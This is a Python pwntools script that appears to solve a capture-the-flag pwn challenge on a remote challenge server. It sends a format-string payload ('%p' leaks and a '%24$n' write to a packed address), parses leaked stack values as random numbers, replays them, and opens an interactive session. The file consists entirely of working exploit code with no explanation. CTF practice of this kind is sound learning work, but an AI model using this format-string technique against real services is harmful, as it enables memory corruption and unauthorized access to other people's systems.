from pwn import *

# p = process('./QiangYun')
p = remote('challenges.hazmat.buptmerak.cn', 20122)
# attachment = ELF('./')
# libc = ELF('./')

p.recvuntil(b"?")
p.send(b'%p' * 10 + b'xxxx%24$nxxx' + p64(0x40408C))
recv = p.recvuntil(b'xxxx').replace(b'xxxx', b'').split(b'(nil)')[-1:][0].split(b'0x')[1:]

randnumber = [0 for i in range(5)]
randnumber[0] = str(int(recv[0][8:16], 16)).encode()
randnumber[1] = str(int(recv[0][:8], 16)).encode()
randnumber[2] = str(int(recv[1][8:16], 16)).encode()
randnumber[3] = str(int(recv[1][:8], 16)).encode()
randnumber[4] = str(int(recv[2][:8], 16)).encode()
payload = b''
for i in range(5):
    payload += randnumber[i] + b'\n'
    print(hex(int(randnumber[i])), int(randnumber[i]))
# gdb.attach(p)
p.send(payload)

p.interactive()